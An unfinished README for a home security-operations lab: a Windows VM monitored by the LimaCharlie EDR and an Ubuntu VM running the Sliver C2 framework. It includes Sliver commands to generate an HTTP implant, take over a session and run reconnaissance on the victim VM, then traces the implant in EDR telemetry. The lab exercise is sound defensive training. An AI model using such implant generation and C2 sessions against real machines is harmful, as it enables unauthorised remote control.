# Home-Soc-Analyst-Project- Need to edit this whole thing and add some images
-A simple setup to make a Security Operation Center, Using Both Ubuntu and win11


Objectives With this project: Make a lab where one machine is an attacker and the other one is the defender, using LimaCharlie to see the telemetry and creation of YARA "Yet Another Recursive Acronym" and Sigma rules, blocking C2 "Command and Control" and privilege scalation, blocking automation using *Sliver*


What i m gonna need:
-a copy of windows 
-a ubutuntu copy 

Part 1 - Put yourself in Adversary Place *Taking Notes and making observations*.

Part 2- Simulating the adversary attack to notice detections.

Part 3- Blocking A Attack. 

Part 4- Adjusting False Positives.

Part 5- Scaning with YARA through rules of detection. 


Explaining a little of LimaCharlie. 
It is a platform of SecOps based in cloud with the focus being EDX/XDR *detection and response* collecting telemetry through the analysis of logs and Security Automation, being able to manage EndPoint Security.

<img width="632" height="309" alt="image" src="https://github.com/user-attachments/assets/b133ad4e-e7c2-4721-90d9-ef932e4d5789" /> 

-Creating a Organization on LimaCharlie 
-Name: it can be any but i choose *Home Soc Analyst*
-Data Residency Region: Closest avaiable  
-Template: No pre-configuration *but you can customize one for different purpouse*
<img width="612" height="562" alt="65" src="https://github.com/user-attachments/assets/03c441c0-0509-4a66-a805-9c0772ac45ce" />

-Sensors 
-Main fonts of receiving data on LimaCharlie, operating through many plataforms that are compatible and sending events in JSON throught the cloud of LimaCharlie live. (Change Later).
<img width="895" height="676" alt="63" src="https://github.com/user-attachments/assets/8508d825-673b-4003-8794-e438b1241fe5" />

-adding a new sensor 
1. Select Endpoint
2. Select Windows
3. I choose: *Windows VM -Lab* but you can choose through your preference
4. Create
5. Select The key that you just make

//add image of installation key 

-Installing a Sensor or Endpoint
//Add Image

Waiting for new sensors. 
-> configure the Virtual machines, and install the EDR of LimaCharlie in the windows system. 


-Windows EDR - Seonsors, monitoring and rules of defense.

open CMD and execute both those commands:
- cd C:\Users\Administrator\Downloads 
- install Key from LimaCharlie: lc_sensor.exe -i *[your_installation_key]*

will POP *connection acquired* of cmd and Lima charlie 
->ad both cmd and lima charlie images to the system. 

-Artifact Colletion:
      They are records of events and data collected from endpoints, networks, and other sources of threat analysis and response. These artifacts can be used for forensic investigation.

<add image>

name: windows-sysmon-logs 
Pattern: well://Microsoft-Windows-Sysmon/Operational:*
Retention Period: 10 Days
Platform: Windows

<add image>

-Extensions *ext-sigma*
Sigma is a detection rule format, enabling rules to identify malicious behavior.

<add image>

-Configuring the Virtual Machine (Linux)

<add image>
      
sudo su – enable the device as superuser.

systemctl status sliver – check if Sliver is active.

<add image>

– Sliver
Sliver is an open-source command-and-control (C2) framework developed by BishopFox, designed for Red Team operations, penetration testing, and adversary simulation. It serves as a modern alternative to tools such as Cobalt Strike and Metasploit, offering support for multiple platforms and secure communication.
Here’s the translation:

<add image>

http – check if the machine is “listening” for possible connections.

jobs – check if the machine has any active processes.

Generating our C2 implant
It is a payload that enables attackers to remotely control a compromised device, through C2 (command and control).
<add image>

generate –http <linux_vm_ip> –save /var/www/payloads 
<add image>

– Accessing the file through Windows
<add image>

– On the Linux machine
<add image>

use [session_id] – replace session_id with the number shown in the image above (in this case bc318fc1).
<add image>

info – simple command to gather information such as machine name, malware name, system type, and language location
<add image>

whoami: basically a “who am I” in Linux — in this specific case, it shows the machine name and its escalation.

pwd: shows the directory path — in this case C:\Users\Administrator\Downloads.

<add image>

netstat: displays the connections currently occurring on the remote system.

ps -T: identifies the processes running on the remote system in a “tree” format.
<add image>

– Going back to the Sensors part

rocesses in the LimaCharlie section – shows the processes running in the LimaCharlie environment.
<add image>

Now that a “suspicious” process has been found: MARKED_REVIEW.exe
<add image>

Connection established with the program MARKED_REVIEW.exe, including the base connection and the destination.
<add image>

Next, following the line of “viewing network connections.”
<add image>

Network – list of connections made, including connections between suspicious files.
<add image>

File System – lists the files on the computer, allowing an easy path to locate them.
<add image>

Scan on VirusTotal to check if there is any process similar or identical, to see if there is a solution for a potential old or documented malware.
<add image>

Hash – ba39c9077470488fed6f7bd37f9539010d6c5b852bb658309b98116edcaf326c
<add image>

Since in this case there is no match, a new detection and response rule needs to be created.
<add image>

Telemetry – real-time data collection and analysis, enabling the creation of defense and detection rules.
<add image>
